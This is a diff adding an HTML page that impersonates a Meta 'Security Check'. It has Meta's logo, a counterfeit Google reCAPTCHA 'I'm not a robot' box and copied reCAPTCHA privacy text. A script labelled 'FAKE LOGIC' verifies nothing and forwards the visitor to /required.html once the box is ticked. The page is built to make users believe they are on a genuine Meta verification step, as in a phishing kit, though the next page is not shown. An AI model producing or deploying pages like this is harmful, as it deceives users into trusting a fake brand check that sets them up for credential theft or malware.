@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Security Check - Meta</title>
+
+  <!-- Tailwind CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/checkbox.css">
+</head>
+
+<body class="bg-white flex items-center justify-center min-h-screen">
+
+  <main class="w-full max-w-[300px] text-gray-800 text-sm">
+
+    <!-- Logo -->
+    <div class="mb-6">
+      <img src="/public/logo-meta.svg" alt="Meta" class="w-16">
+    </div>
+
+    <!-- CAPTCHA BOX -->
+    <div class="bg-[#f9f9f9] border rounded-md flex items-center justify-between px-3 py-4">
+
+      <div class="flex items-center gap-2">
+        <label class="checkbox">
+          <input type="checkbox" id="robotCheckbox">
+          <svg viewBox="0 0 21 21">
+            <path d="M5 10.75L8.5 14.25L19.4 2.3C18.8 1.4 18 1 17 1H4C2.35 1 1 2.35 1 4V17C1 18.65 2.35 20 4 20H17C18.65 20 20 18.65 20 17V8"></path>
+          </svg>
+        </label>
+
+        <span class="text-gray-600 font-medium">I’m not a robot</span>
+      </div>
+
+      <div class="flex flex-col items-center text-[9px] text-gray-400">
+        <img src="/public/recaptcha.png" class="w-9 mb-1">
+        <strong class="text-[10px]">reCAPTCHA</strong>
+        <span>Privacy · Terms</span>
+      </div>
+
+    </div>
+
+    <!-- CONTENT -->
+    <div class="mt-5 text-[13px] leading-snug text-gray-700">
+      <p>
+        This helps us prevent harmful behavior, detect and stop spam,
+        and maintain the integrity of our Products.
+      </p>
+
+      <p class="mt-4">
+        We use Google reCAPTCHA Enterprise to provide this security check.
+        Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy
+        and Terms of Service.
+      </p>
+
+      <p class="mt-4">
+        reCAPTCHA Enterprise collects hardware and software information,
+        such as device and application data, to support security purposes.
+        Google does not use this information for personalized advertising.
+      </p>
+    </div>
+
+  </main>
+
+  <!-- FAKE LOGIC -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const checkbox = document.getElementById("robotCheckbox");
+      if (checkbox) {
+        checkbox.addEventListener("change", () => {
+          if (checkbox.checked) {
+            setTimeout(() => {
+              window.location.href = "/required.html";
+            }, 700);
+          }
+        });
+      }
+    });
+  </script>
+
+</body>
+</html>
